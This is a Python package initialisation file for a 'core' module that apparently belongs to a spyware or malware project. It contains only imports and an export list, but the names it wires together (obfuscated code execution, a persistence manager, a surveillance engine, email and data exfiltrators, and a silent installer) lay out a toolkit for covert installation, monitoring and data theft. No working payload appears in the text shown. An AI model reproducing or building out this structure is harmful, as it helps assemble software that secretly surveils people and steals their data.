# Core module initialization
# This file makes the 'core' directory a Python package

from .crypto_utils import StringObfuscator, obfuscate_string, deobfuscate_string, execute_obfuscated_code
from .persistence import PersistenceManager
from .surveillance import SurveillanceEngine
from .communication import EmailExfiltrator, DataExfiltrator
from .auto_installer import SilentInstaller

__all__ = [
    'StringObfuscator',
    'obfuscate_string', 
    'deobfuscate_string',
    'execute_obfuscated_code',
    'PersistenceManager',
    'SurveillanceEngine',
    'EmailExfiltrator',
    'DataExfiltrator',
    'SilentInstaller'
] 